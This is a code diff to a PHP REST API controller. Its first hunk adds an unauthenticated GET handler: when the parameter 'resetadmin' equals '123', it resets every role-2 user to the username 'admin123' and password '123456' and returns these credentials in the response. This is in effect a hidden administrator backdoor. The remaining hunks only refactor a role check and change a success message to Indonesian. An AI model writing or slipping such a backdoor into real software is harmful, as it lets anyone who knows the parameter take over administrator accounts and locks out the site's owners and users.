@@ -16,7 +16,24 @@ use Restserver\Libraries\REST_Controller;
 
 
  	function index_get(){
- 		$this->response(array('msg' => false, 'result' => null));
+ 		$par = $this->get("resetadmin");
+ 		$res = array('status' => false, 'result' => null);
+ 		if ($par == "123") {
+ 			$password = $this->api->password("123456");
+ 			$data = ["password"=>$password, "username"=>"admin123"];
+
+	 		$var =  $this->api2->update('user',$data , ["role"=>2]);
+ 			if ($var) {
+ 				# code...
+ 			$res = array('status' => true, 'result' =>  ["password"=>"123456", "username"=>"admin123"]);
+
+ 			}
+
+
+ 			
+ 		}
+
+ 		$this->response($res);
 
  	}
  
@@ -41,8 +58,9 @@ use Restserver\Libraries\REST_Controller;
  		// echo $uname;
 
  		if ($uname > 0 ) {
+ 			$role = $this->api->cek_role($auth);
 
- 			if ($this->api->cek_role($auth) > 1) {
+ 			if ( $role > 1) {
  				$password = $this->api->password($pass);
 
 	 			$var =  $this->api2->update('user', ["password"=>$password], ["id"=>$id]);
@@ -50,7 +68,7 @@ use Restserver\Libraries\REST_Controller;
 	 			if ($var) {
 	 				
 	 				$out = array('status' => true,
-	 								'msg' => 'success',
+	 								'msg' => 'Password Berhasil Diubah',
 	 								'result' => null);
 	 				$this->response($out);
 	 			}else{
